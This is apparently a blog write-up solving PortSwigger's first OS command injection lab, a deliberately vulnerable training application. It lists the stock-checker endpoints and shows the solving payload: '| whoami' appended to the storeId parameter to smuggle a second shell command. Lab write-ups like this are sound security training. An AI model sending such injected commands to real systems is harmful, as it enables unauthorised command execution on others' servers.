---
layout: post
title:  "PortSwigger - Command Injection - Lab 1"
date:   2024-07-07 18:20
image:  /images/portswigger/WebSecurityAcademy.png
tags:   [command-injection]
categories: [PortSwigger]
---

# Lab 1 - OS Command Injection - Simple Case
><b>Lab Objective:</b>
<br/><br/>
This lab contains an OS command injection vulnerability in the product stock checker.
The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.
To solve the lab, execute the whoami command to determine the name of the current user.
<br/>
<br/>
<b>Reference:</b>
<br/>
<a href="https://portswigger.net/web-security/os-command-injection/lab-simple">Port Swigger - Lab 1</a>
<br/>
<a href="https://academy.ranakhalil.com/courses/1491236/lectures/38308204">Rana Khalil - Lab 1</a>
<br/>



### Solution
<hr/>

#### 1. Take note of all possible endpoint calls that accepts user input from the UI:

```
GET /product?productId=1
```
```
POST /product/stock 
body: productId=1&storeId=1
```

#### 2. Append | whoami to POST  /product/stock    storeId parameter

```
product=1&storeId = 1 | whoami
```
![Command Injection - Lab 1 - Response](/images/portswigger/CommandInjection/lab1/command_injection_lab_1_response.png)

<hr/>